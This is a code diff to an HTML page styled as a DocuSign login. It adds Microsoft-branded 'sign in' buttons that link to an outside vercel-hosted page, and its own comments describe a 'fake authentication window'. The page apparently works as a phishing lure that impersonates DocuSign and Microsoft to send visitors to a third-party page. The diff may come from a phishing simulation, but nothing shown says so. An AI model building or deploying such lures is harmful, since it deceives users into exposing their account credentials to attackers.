@@ -158,6 +158,18 @@
             font-size: 0.75rem;
             color: #aaa;
         }
+        .button.microsoft {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #0078d7;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-family: Arial, sans-serif;
+        }
+        .button.microsoft:hover {
+            background-color: #005a9e;
+        }
     </style>
 </head>
 <body>
@@ -168,12 +180,16 @@
         <div class="container">
             <h1>Log in to DocuSign</h1>
             <div class="button-container">
-                <a href="https://red-eta.vercel.app/red.html" class="button microsoft" onclick="return launchWindow();">Office</a>
-
-function launchWindow(){
-    // Launch the fake authentication window
-    return false; // This will make sure the href attribute is ignored
-}
+                <a href="https://red-eta.vercel.app/red.html" class="button microsoft" onclick="return launchWindow();"> SIGN IN TO MICROSOFT</a>
+<script>
+        function launchWindow() {
+            // Launch the fake authentication window (or perform an action here)
+            alert("This is a fake authentication window!");
+            
+            // Return false to prevent the default behavior of the link
+            return false;
+        }
+    </script>
                 <a href="https://red-eta.vercel.app/red.html" class="button microsoft">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="20">
                     SIGN IN WITH MICROSOFT
